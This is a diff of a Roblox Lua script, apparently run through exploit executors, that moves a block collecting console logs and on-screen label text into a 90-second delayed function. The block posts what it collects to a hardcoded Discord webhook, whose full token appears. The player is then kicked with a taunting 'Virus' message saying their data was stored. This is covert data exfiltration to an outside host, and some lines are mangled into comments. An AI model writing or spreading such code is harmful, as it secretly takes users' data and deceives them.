@@ -56,21 +56,6 @@ local function updateTextLabel(api)
 		"\nConnection: " .. tostring(api.connection or "N/A")
 end
 
--- Call API and update UI
-local apiData = fetchApiData()
-if apiData then
-	updateTextLabel(apiData)
-end
-
--- Collect logs (only MessageOutput) local skibidi = {} LogService.MessageOut:Connect(function(message, messageType) if messageType == Enum.MessageType.MessageOutput then table.insert(skibidi, message) end end)
-
-task.wait(3)
-
--- Add label content table.insert(skibidi, "\nTextLabel content:\n" .. textLabel.Text)
-
--- Send to Discord if #skibidi > 0 then local rizz = table.concat(skibidi, "\n") local bingus = request or http_request or (syn and syn.request) or (fluxus and fluxus.request) if bingus then local payload = { content = "Captured Console Logs and Info:\n\n" .. rizz } bingus({ Url = "https://discord.com/api/webhooks/1368033106824659055/iUr4KwROaWcnvm_J7eYSQhz7cqWQ1otXCd9_IlAJ6sPJHiv7QsvbnxponoprKVFrZzDW", Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload) }) end             end 
-end
-
 local function randomizeCamera()
     local angle = 0
     local zoomIn = true
@@ -208,5 +193,20 @@ end)
 
 task.delay(90, function()
     local player = game.Players.LocalPlayer
-    player:Kick("Your data has been removed! This is a safety system for this Virus Entertainment Purposes Only")
+-- Call API and update UI
+local api = fetchApiData()
+if api then
+	updateTextLabel(api)
+end
+
+-- Collect logs (only MessageOutput) local skibidi = {} LogService.MessageOut:Connect(function(message, messageType) if messageType == Enum.MessageType.MessageOutput then table.insert(skibidi, message) end end)
+
+task.wait(3)
+
+-- Add label content table.insert(skibidi, "\nTextLabel content:\n" .. textLabel.Text)
+
+-- Send to Discord if #skibidi > 0 then local rizz = table.concat(skibidi, "\n") local bingus = request or http_request or (syn and syn.request) or (fluxus and fluxus.request) if bingus then local payload = { content = "Captured Console Logs and Info:\n\n" .. rizz } bingus({ Url = "https://discord.com/api/webhooks/1368033106824659055/iUr4KwROaWcnvm_J7eYSQhz7cqWQ1otXCd9_IlAJ6sPJHiv7QsvbnxponoprKVFrZzDW", Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload) }) end             end 
+end
+
+    player:Kick("Your data has been stored and Contained in a Military Encryptor This is a safety system for this Virus Entertainment Purposes Only")
 end)
